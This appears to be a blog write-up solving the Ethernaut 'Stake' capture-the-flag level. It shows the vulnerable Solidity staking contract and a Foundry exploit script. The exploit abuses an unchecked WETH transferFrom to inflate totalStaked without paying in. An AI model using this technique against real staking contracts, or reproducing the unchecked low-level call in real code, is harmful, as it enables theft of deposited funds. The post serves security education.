---
layout: post
title: "[Ethernaut] 31.Stake"
tags: blockchain ethernaut foundry erc20 safeerc20 low-level_call state
---

# Analysis

---

The goal is

1. The `Stake` contract's ETH balance has to be greater than 0.
2. `totalStaked` must be greater than the Stake contract's ETH balance.
3. You must be a staker.
4. Your staked balance must be 0.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

The `StakeETH()` function sends ether to Stake contract and adds `msg.value` to `totalStaked` and `UserStake` .

The `Unstake()` function transfers ether from Stake contract to `msg.sender` with subtracts the `amount` from `totalStaked` and `UserStake`.

The `StakeWETH()` function check the `allowance` of `msg.sender` for Stake contract. If the `allowance`  is greater than `amount` , the `amount` is added to `totalStaked` and `UserStaked` .

![Image allowance]({{site.url}}/images/2026-01-22-Stake/allowance.png)

then, the Stake contract transfers WETH from `msg.sender`.

![Image transferFrom]({{site.url}}/images/2026-01-22-Stake/transferFrom.png)

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Stake.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "forge-std/Script.sol";

contract Ex {
    Stake public stake_ = Stake(0x4929Ca2266CF0b913216c2bCdEE5D8107FA51cbC);

    function ex1() public {
        ERC20(stake_.WETH()).approve(address(stake_), 0.002 ether);
        stake_.StakeWETH(0.002 ether);
    }

    function ex2() public payable {
        stake_.StakeETH{value: 0.002 ether}();
    }
}

contract StakeSol is Script {
    Stake public stake_ = Stake(0x4929Ca2266CF0b913216c2bCdEE5D8107FA51cbC);

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();
        ex.ex1();
        ex.ex2{value: 0.002 ether}();
        console.log("The Stake contract's ETH balance:  ", address(stake_).balance);
        console.log("totalStaked :                      ", stake_.totalStaked());
        console.log("You must be a staker:              ", stake_.Stakers(msg.sender));
        console.log("staked balance before:             ", stake_.UserStake(msg.sender));

        stake_.StakeETH{value: 0.002 ether}();
        stake_.Unstake(0.002 ether);
        console.log("====================");
        console.log("The Stake contract's ETH balance:  ", address(stake_).balance);
        console.log("totalStaked before:                ", stake_.totalStaked());
        console.log("You must be a staker:              ", stake_.Stakers(msg.sender));
        console.log("staked balance before:             ", stake_.UserStake(msg.sender));

        vm.stopBroadcast();
    }
}
```

According to the challenge info([ERC20](https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md#allowance)), the `allowance()` function returns the amount that `_spender` is still allowed to withdraw from `_owner`.

We need the assist(Ex) contract to `approve` the Stake contract for the amount larger than 0.001 ether .

Because the Ex contract does not have any WETH, the `transferFrom()` function will failed. However, the amount is added to `totalStaked` and `UserStake`.

Now, there is an inconsistency bwtween the real balance and the reported balance.

To become a staker and set the staked balance to 0, execute `StakeETH()` and `Unstake()`  function.